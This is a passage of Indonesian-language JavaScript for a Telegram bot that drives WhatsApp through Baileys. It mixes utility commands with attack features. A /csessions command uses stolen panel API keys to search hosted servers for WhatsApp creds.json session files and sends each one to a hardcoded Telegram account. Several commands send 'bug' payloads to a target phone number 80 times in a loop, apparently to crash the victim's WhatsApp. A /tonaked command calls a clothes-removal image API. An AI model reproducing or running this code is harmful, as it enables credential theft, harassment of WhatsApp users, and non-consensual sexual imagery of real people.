  processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
⬡ IP: ${data.ip || "-"}
⬡ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⬡ Region: ${data.region || "-"}
⬡ City: ${data.city || "-"}
⬡ ZIP: ${data.postal || "-"}
⬡ Timezone: ${data.timezone_gmt || "-"}
⬡ ISP: ${data.isp || "-"}
⬡ Org: ${data.org || "-"}
⬡ ASN: ${data.asn || "-"}
⬡ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 Location", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailurl !== "undefined" && thumbnailurl) {
        await ctx.replyWithPhoto(thumbnailurl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("addsender", checkOwnerOrAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Kirim session JSON langsung setelah command.\nContoh:\n/addsender {\"creds\":{...}}");
  }

  // Gabungkan semua teks setelah "/addsender " menjadi string JSON
  const sessionText = ctx.message.text.replace("/addsender ", "").trim();

  try {
    JSON.parse(sessionText); // cek validitas JSON

    const sessionName = "sender_" + Date.now(); // nama unik
    const sessionPath = `./sessions/${sessionName}`;
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    // Simpan ke creds.json
    fs.writeFileSync(`${sessionPath}/creds.json`, sessionText);

    // Load session langsung
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const newSock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
    });

    newSock.ev.on("creds.update", saveCreds);

    newSock.ev.on("connection.update", ({ connection }) => {
      if (connection === "open") {
        ctx.reply(`✅ Sender *${sessionName}* berhasil terhubung ke WhatsApp!`);
        senders.push({ name: sessionName, sock: newSock });
      }
    });

  } catch (e) {
    console.error("❌ Gagal load session:", e.message);
    ctx.reply("❌ Session tidak valid. Pastikan isi JSON benar.");
  }
});
bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;
  const idtele = "7124431930";

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Format: /csessions https://domainpanel.com,ptla_ID,ptlc_ID");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("❌ Format: /csessions https://panelku.com,plta_ID,pltc_ID");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(idtele, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

bot.command("tourl", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const file = await ctx.telegram.getFile(fileId);
const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

const res = await axios.get(fileUrl, { responseType: "arraybuffer" });

const FormData = require("form-data");
const formData = new FormData();

formData.append("reqtype", "fileupload");
formData.append("fileToUpload", res.data, "file.jpg");

const { data } = await axios.post("https://catbox.moe/user/api.php", formData, {
  headers: formData.getHeaders(),
});

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.danzy.web.id/api/maker/brat?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("getcode", checkOwnerOrAdmin, async (ctx) => {
  const senderId = ctx.from.id;
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url)
    return ctx.reply("❌ Format :: /getcode https://namaweb");
  if (!/^https?:\/\//i.test(url))
    return ctx.reply("❌ URL tidak valid.");

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000,
    });

    const htmlContent = response.data;
    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await ctx.replyWithDocument({ source: filePath }, {
      caption: `✅ Get Code By Xevorz Catalyze ( 🍁 )\nURL : ${url}`,
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: " + err.message);
  }
});

bot.command("enchtml", async (ctx) => {
  if (!ctx.message.reply_to_message?.document) {
    return ctx.reply("❌ Please reply to a .html file you want to encrypt");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);

    const fileUrl = `https://api.telegram.org/file/bot${TOKEN_BOT}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent).toString("base64");

    const encryptedHTML = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Encrypted Page</title>
</head>
<body>
  <script>
    const encoded = "${encoded}";
    const decoded = atob(encoded);
    document.write(decoded);
  </script>
</body>
</html>
`;

    await ctx.replyWithDocument({
      source: Buffer.from(encryptedHTML),
      filename: "encrypted.html"
    });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ An error occurred while encrypting the HTML.");
  }
});

bot.command("tonaked", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  let imageUrl = args || null;

  if (
    !imageUrl &&
    ctx.message.reply_to_message &&
    ctx.message.reply_to_message.photo
  ) {
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;

    const fileLink = await ctx.telegram.getFileLink(fileId);
    imageUrl = fileLink.href;
  }

  if (!imageUrl) {
    return ctx.reply("❌ Format: /tonaked (reply gambar)");
  }

  const statusMsg = await ctx.reply("⏳ Memproses gambar");

  try {
    const res = await fetch(
      `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
    );

    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ Gagal memproses gambar, pastikan URL atau foto valid"
      );
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(hasil);
  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "❌ Terjadi kesalahan saat memproses gambar"
    );
  }
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|xzellxopz",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Xevorz Catalyze ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("tryfunc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("❌  Format: /tryfunc 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
⬡ ターゲット : ${q}
⬡ タイプ バグ : Uknown Function 
⬡ バグステータス : Proccesing`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(2000)
      }

      const finalText = `<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
⬡ ターゲット : ${q}
⬡ タイプ バグ : Uknown Function 
⬡ バグステータス : Succes`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {
    console.log(err)
    }
  }
)

// ~ Access ~ \\
bot.command("setcd", checkOwnerOrAdmin, async (ctx) => {

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("❌ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /addadmin ID"
    );
  }

  const userId = args[1];
  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} already become admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Succes add ${userId} to admin`);
});

bot.command("addprem", checkOwnerOrAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /addprem ID"
    );
  }

  const userId = args[1];
  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ User ${userId} already become premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Succes add ${userId} to premium`
  );
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /deladmin ID"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`User ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Succes delete user ${userId} from admin.`);
});

bot.command("delprem", checkOwnerOrAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /delprem ID"
    );
  }

  const userId = args[1];
  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`User ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Succes delete user ${userId} from premium.`);
});



// ~ Cek Premium ~ \\
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (premiumUsers.includes(userId)) {
    return ctx.reply(`Premium Acces`);
  } else {
    return ctx.reply(`Not Premium`);
  }
});

// ~ Case Pairing ~ \\
bot.command("connect", checkOwner, async (ctx) => {
  const date = getCurrentDate();
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Format: /connect 62xx"
    );
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  try {
    const code = await sock.requestPairingCode(phoneNumber, "VANZZPRO");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(thumbnailurl, {
      caption: `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>  
⬡ ターゲット : ${phoneNumber}  
⬡ コードペアリング : ${formattedCode}  
⬡ デイデイト : ${date}
`,

   parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  } catch (error) {
  
 console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing !"
    );
  }
});

// ~ Delete Sessions ~ \\
bot.command("killsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("Succes Delete Sessions");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});
// ~ Close Pairing ~ \\
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});

// ~ Function Sleep ( Untuk Jeda Saat Kirim Bug ) ~ \\
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ~ Case Bug ~ \\
bot.command("Xvanx", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
                 
    if (!q) {
      return ctx.reply(`❌ Format : /Xvanx 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/pbsbry.jpg",
      {
        caption: `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : Xvanx
⬡ バグステータス : Proccesing
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));
    for (let i = 0; i < 80; i++) {
      await FcNoClik(sock, target);
      await FcNoClik(sock, target);
      await LocationUi(sock, target);
      await Object11(sock, target);
      await VNFnewbulldoser(sock, target);
      await NanasDelayHard(sock, target);
      await NanasDelayHard(sock, target);
      await NanasDelayHard(sock, target);
      await sleep(4000);
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : Xvanx
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ~ Case Bug 2 ~ \\
bot.command("Andronew",checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
                 
    if (!q) {
      return ctx.reply(`❌ Format : /Andronew 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/pbsbry.jpg",
      {
        caption: `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : Andronew
⬡ バグステータス : Process
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));
    for (let i = 0; i < 80; i++) {
      await Object11(sock, target);
      await LocationUi(sock, target);
      await Object11(sock, target);
      await LocationUi(sock, target);
      await FcNoClik(sock, target);
      await NanasDelayHard(sock, target);
      await sleep(4000);
      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : Andronew
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ~ Case Bug 3 ~ \\
bot.command("DelayArrow", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
  
    if (!q) {
      return ctx.reply(`❌ Format : /DelayArrow 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan proses dimulai dan simpan messageId-nya
    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/pbsbry.jpg",
      {
        caption: `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : DelayArrow
⬡ バグステータス : Process
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));

    for (let i = 0; i < 80; i++) {
      await NanasDelayHard(sock, target);
      await NanasDelayHard(sock, target);
      await NanasDelayHard(sock, target);
      await VNFnewbulldoser(sock, target);
      await VNFnewbulldoser(sock, target);
      await FcNoClik(sock, target);
      await FcNoClik(sock, target);
      await FcNoClik(sock, target);
      await sleep(4000);
      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : DelayArrow
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ~ Case Bug 4 ~ \\
bot.command("ForceNew",checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
  
    if (!q) {
      return ctx.reply(`❌ Format : /ForceNew 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan proses dimulai dan simpan messageId-nya
    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/pbsbry.jpg",
      {
        caption: `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

